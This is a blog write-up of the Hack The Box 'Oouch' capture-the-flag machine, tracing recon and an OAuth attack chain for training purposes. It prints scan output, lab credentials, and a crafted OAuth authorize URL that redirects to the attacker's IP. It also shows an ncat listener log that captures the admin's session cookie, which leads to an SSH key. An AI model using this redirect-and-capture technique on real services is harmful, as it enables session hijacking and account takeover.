
##
#
https://mishrasunny174.tech/post/htb-oouch-writeup/
#
##


HTB Oouch Writeup
writeup for HTB Oouch Box

Last updated on Jan 31, 2021 12 min read writeups, htb
Oouch Writeup
images/Untitled.png

Starting the recon with a nmap scan to scan for ports and services running on them

PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 63 vsftpd 2.0.8 or later                
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                     
|_-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt
| ftp-syst:                                                                
|   STAT:                                                                  
| FTP server status:         
|      Connected to 10.10.14.185                                           
|      Logged in as ftp                                                    
|      TYPE: ASCII                                                                                                                                     
|      Session bandwidth limit in byte/s is 30000                          
|      Session timeout in seconds is 300                                   
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxVFDvWMZRJQ6DlQkjKUsp3Mz6vSQ64sDpR/hQogkUWR/lauECt86N34eRQmABl8IHGROUaH8EoNNy5ByJQk8TrHy+lD1TCKUlNyD8Cw5i4/JtS
MHYasq/3mOdkciBCyNf7vVvEtadG1EsFvTfD2mOTNGt8rj61tp8VBvDIbSq1a4+SCkjBo2c3FW4sPkI1byfypASLlwwVXv/zZ58Ff5C47MZrA2fW9TdhBlkXleqv/6jeuYEpmEQRoiTxmdfpyVkr1/w
BFs25jELQLv5DTyJyIrqT0WqHlyo5eBuax1ZEuNTxCVs2P48YxYIn5F8gfHPgSN7LzLclfAyghwe0oJp
|   256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIChK8SPfCVZj8VEE4jX8jzGbd5wB2nrxtLQkze3vxFxQ
5000/tcp open  http    syn-ack ttl 62 nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
|_http-server-header: nginx/1.14.2
| http-title: Welcome to Oouch
|_Requested resource was http://10.10.10.177:5000/login?next=%2F
8000/tcp open  rtsp    syn-ack ttl 62 
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 400 Bad Request
|   FourOhFourRequest, GetRequest, HTTPOptions:                                                                                             
|     HTTP/1.0 400 Bad Request                                             
|     Content-Type: text/html                                              
|     Vary: Authorization                                                  
|     <h1>Bad Request (400)</h1>                                           
|   RTSPRequest:                                                           
|     RTSP/1.0 400 Bad Request                                             
|     Content-Type: text/html
|     Vary: Authorization                                                  
|     <h1>Bad Request (400)</h1>                                           
|   SIPOptions:                                                                                                                                        
|     SIP/2.0 400 Bad Request                                              
|     Content-Type: text/html                                              
|     Vary: Authorization                                                  
|_    <h1>Bad Request (400)</h1>                                           
|_http-title: Site doesn't have a title (text/html).
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/sub
mit.cgi?new-service :                                                                                                                                  
SF-Port8000-TCP:V=7.80%I=7%D=7/7%Time=5F04929E%P=x86_64-pc-linux-gnu%r(Get
SF:Request,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/html\r\nVary:\x20Authorization\r\n\r\n<h1>Bad\x20Request\x20\(400\)</h                                                                             
SF:1>")%r(FourOhFourRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nCont                                                                             
SF:ent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n<h1>Bad\x20Requ                                                                             
SF:est\x20\(400\)</h1>")%r(HTTPOptions,64,"HTTP/1\.0\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n<h1>                                                                             
SF:Bad\x20Request\x20\(400\)</h1>")%r(RTSPRequest,64,"RTSP/1\.0\x20400\x20
SF:Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization\
SF:r\n\r\n<h1>Bad\x20Request\x20\(400\)</h1>")%r(SIPOptions,63,"SIP/2\.0\x
SF:20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Autho
SF:rization\r\n\r\n<h1>Bad\x20Request\x20\(400\)</h1>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
we find that FTP has anonymous login enabled and it contains a single file project.txt which contains the following content which suggests some kind of authorization server is running judging by the name of the machine it might by OAuth.

Flask -> Consumer
Django -> Authorization Server
Visiting the web service running on port 5000 we are prompted to login or to create a account.

images/Untitled%201.png

Registering for a account and then login in to the server, now running gobuster on web service which is running on port 5000 reveals few interesting endpoints.

===============================================================
2020/07/07 21:15:11 Starting gobuster
===============================================================
/about (Status: 302)
/contact (Status: 302)
/documents (Status: 302)
/home (Status: 302)
/login (Status: 200)
/logout (Status: 302)
/oauth (Status: 302)
/profile (Status: 302)
/register (Status: 200)
which confirms our hypotheses about OAuth implementation. Visiting /oauth reveals the hostname consumer.oouch.htb and also a procedure that needs to be followed to be able to use the server.

images/Untitled%202.png

also /contact takes input which contains a form which takes message to be sent to the admin which might be helpful and also lead to ssrf

images/Untitled%203.png

/documents is also interesting which might contain some sensitive information if we are able to become admin

images/Untitled%204.png

/profile

images/Untitled%205.png

visiting http://consumer.oouch.htb:5000/oauth/connect reveals the hostname for the web service on port 8000

images/Untitled%206.png

adding that to /etc/hosts file we can visit the web server on port 8000 and then visiting it reveals the authorization server.

images/Untitled%207.png

creating another account on the authorization.oouch.htb for creating oauth application.

images/Untitled%208.png

now monitoring the oauth procedure from our previous account we get a request with token code to connect the account.

HTTP/1.1 302 Found
Content-Type: text/html; charset=utf-8
Location: http://consumer.oouch.htb:5000/oauth/connect/token?code=vxF9Rkt1f5qX4AmAYY8AchFqpkbZ9g
X-Frame-Options: SAMEORIGIN
Content-Length: 0
Vary: Authorization, Cookie
now sending this url to the /contact form and then going to http://consumer.oouch.htb:5000/oauth/login we get logged in as qtc.

images/Untitled%209.png

now we can also access /documents

images/Untitled%2010.png

now again gobusting http://authorization.oouch.htb:8000/oauth/ we get another endpoint as /applicationsvisiting /applications we get greeted with a login prompt.

images/Untitled%2011.png

using the username and password found above develop:supermegasecureklarabubu123! we are unable to login. Running gobuster again on http://authorization.oouch.htb:8000/oauth/applications/ we get another hit as /register (Status: 301) we can login there using the found usernames and password.

images/Untitled%2012.png

which is prompting us to create an application. Creating a new application while setting the redirect uri to point to our machine.

images/Untitled%2013.png

now we can use ssrf to make the admin authorize our application by making a request to the http://authorization.oouch.htb:8000/oauth/authorize/ endpoint which will get redirected to our machine with the code and session id included. After reading the documentations extensively i was able to create the correct request as

http://authorization.oouch.htb:8000/oauth/authorize/?client_id=HqdQEKHcW8DUJJ1S3bVcrX8qyUYmmbVe4NNnBm28&response_type=code&redirect_uri=http://10.10.14.84:80/&allow=Authorize&state=&scope=read+write
sending this url to /contact we get the request back to our server with sessionid and code

➜  Oouch git:(master) ✗ ncat -nlvkp 80           
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.10.177.
Ncat: Connection from 10.10.10.177:46244.
GET /?error=unauthorized_client HTTP/1.1
Host: 10.10.14.84
User-Agent: python-requests/2.21.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Cookie: sessionid=rfs9zfoljt4a4owbzql6l75krmhlfr21;
setting the sessionid cookie we get the session as qtc on the authorization.oouch.htb

images/Untitled%2014.png

now making a request to /oauth/token endpoint we can get an auth token for the user qtc.

images/Untitled%2015.png

now we can access the api @ /api/get_user

images/Untitled%2016.png

after fuzzing the endpoints i get another api endpoint as /api/get_ssh which gives us the ssh key for the user qtc
